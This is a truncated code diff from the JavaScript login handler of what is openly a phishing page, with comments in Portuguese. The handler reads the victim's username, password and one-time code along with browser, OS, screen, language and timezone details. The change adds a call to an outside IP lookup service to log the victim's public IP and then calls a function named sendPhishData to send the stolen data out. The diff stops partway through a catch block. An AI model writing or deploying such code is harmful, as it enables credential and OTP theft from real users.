@@ -318,23 +318,26 @@ function tryLogin(){
   else if (userAgent.match(/Macintosh/i)) os = 'macOS';
   else if (userAgent.match(/Linux/i)) os = 'Linux';
 
-  var screenRes = screen.width + 'x' + screen.height;
+    var screenRes = screen.width + 'x' + screen.height;
   var lang = navigator.language;
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   var timestamp = new Date().toLocaleString('pt-BR');
-
-  // Dados Básicos
-  var baseData = {
-    user: u.value.trim(),
-    pass: p.value,
-    isMobile: isMobile,
-    browser: browser,
-    os: os,
-    screenRes: screenRes,
-    lang: lang,
-    timezone: timezone,
-    timestamp: timestamp
-  };
+  
+  // NOVO: Captura o IP público (via serviço de terceiros para ser mais preciso)
+  // O Vercel não passa o IP real no header x-forwarded-for de forma confiável para o client-side
+  // Mas podemos usar um serviço de IP para o client-side obter o IP público da vítima
+  var clientIP = 'Indisponível (Client-Side)';
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      clientIP = data.ip;
+      // Atualiza a variável para ser usada no envio final
+      // Como o fetch é assíncrono, vamos esperar ele terminar antes de enviar o principal
+      return sendPhishData(clientIP);
+    })
+    .catch(() => {
+      // Se o serviço de IP falhar, envia mesmo assim
+     
 
   // Verifica se há campo de código de verificação (OTP)
   var hasOtp = isOtpVisible && otpInput.value.trim() !== '';
